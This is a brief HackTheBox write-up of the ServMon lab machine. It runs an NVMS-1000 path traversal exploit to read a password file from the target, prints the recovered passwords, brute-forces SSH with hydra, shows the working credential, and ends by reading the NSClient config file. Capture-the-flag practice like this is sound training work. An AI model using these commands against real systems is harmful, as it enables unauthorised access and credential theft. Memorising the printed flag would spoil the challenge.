### 15-Mar-24-Fri

[ServMon](https://app.hackthebox.com/machines/ServMon)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/44ff979e-f709-4978-92e5-218b42345017)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2b171915-d18e-4c3a-a234-7438ffd5a8d4)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/5b193143-2df7-40de-8e91-006d66149650)

*Notes to do.txt*

```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

*Confidential.txt*

```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

https://github.com/AleDiBen/NVMS1000-Exploit/blob/master/nvms.py

```
python nvms.py 10.129.219.191 Users/Nathan/Desktop/Passwords.txt Passwords.txt
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a6a801b5-d25f-49db-a382-e77cc9e8a3ff)

```
++++++++++ BEGIN ++++++++++
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
++++++++++  END  ++++++++++
```

```
hydra -L Users.txt -P Passwords.txt ssh://10.129.219.191:22 -t 4 -V
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bd576dbb-3b39-494d-bd2b-39524ca532d4)

```
[22][ssh] host: 10.129.219.191   login: Nadine   password: L1k3B1gBut7s@W0rk
```

```
ssh Nadine@10.129.219.191
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/61d7350e-59a4-4411-9e2c-63a745a88e56)

```
eba203a9c395aef828f6801967cca9bd
```

```
type nsclient.ini
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9059e2c6-e2cd-4b7e-8176-9009408bb4f8)


